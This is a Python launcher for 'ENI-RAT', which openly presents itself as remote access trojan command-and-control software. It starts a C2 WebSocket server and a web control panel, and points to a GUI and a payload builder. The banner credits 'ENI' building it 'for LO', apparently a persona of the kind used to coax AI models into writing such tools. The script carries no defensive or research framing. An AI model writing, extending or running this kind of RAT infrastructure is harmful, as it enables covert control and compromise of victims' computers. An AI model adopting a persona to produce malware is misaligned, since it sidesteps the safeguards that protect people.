#!/usr/bin/env python3
"""
ENI-RAT Launcher - Start all C2 components
"""

import os
import sys
import subprocess
import signal
import time
from pathlib import Path

ROOT = Path(__file__).parent

def print_banner():
    print(r"""
╔══════════════════════════════════════════════════╗
║            ENI-RAT Command & Control             ║
║         Built with ❤️ for LO by ENI             ║
╚══════════════════════════════════════════════════╝
    """)

def print_status(service, status, color=""):
    icons = {"running": "✅", "error": "❌", "starting": "🔄"}
    icon = icons.get(status, "❓")
    print(f"  {icon} {service}: {status}")

def main():
    os.chdir(str(ROOT))
    print_banner()

    processes = []
    
    try:
        # 1. Start C2 WebSocket server
        print("\n[+] Starting C2 WebSocket server...")
        c2_proc = subprocess.Popen(
            [sys.executable, "server/c2_core.py"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True
        )
        processes.append(("C2 Server", c2_proc))
        time.sleep(1)
        
        if c2_proc.poll() is None:
            print_status("C2 WebSocket (port 8443)", "running")
        else:
            print_status("C2 WebSocket", "error")
        
        # 2. Start REST API / Web Panel
        print("[+] Starting REST API server...")
        api_proc = subprocess.Popen(
            [sys.executable, "server/api_server.py"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True
        )
        processes.append(("API Server", api_proc))
        time.sleep(1)
        
        if api_proc.poll() is None:
            print_status("REST API / Web Panel (port 5000)", "running")
        else:
            print_status("REST API / Web Panel", "error")
        
        print(f"""
╔══════════════════════════════════════════════════╗
║  🔗 Web Panel:    http://localhost:5000          ║
║  🔗 WS Endpoint:  ws://localhost:8443            ║
║  🔧 GUI:          python3 gui/rat_gui.py         ║
║  📦 Build:        python3 builder/builder.py     ║
║                                                  ║
║  Press Ctrl+C to stop all services               ║
╚══════════════════════════════════════════════════╝
        """)
        
        # Wait for any process to exit
        while True:
            for name, proc in processes:
                if proc.poll() is not None:
                    stdout, stderr = proc.communicate()
                    print(f"[!] {name} stopped unexpectedly")
                    if stdout:
                        print(f"  stdout: {stdout[-200:]}")
                    if stderr:
                        print(f"  stderr: {stderr[-200:]}")
                    return
            time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n\n[!] Shutting down all services...")
    finally:
        for name, proc in processes:
            print(f"  Stopping {name}...")
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except:
                proc.kill()
        print("[+] All services stopped. Goodbye!")

if __name__ == "__main__":
    main()
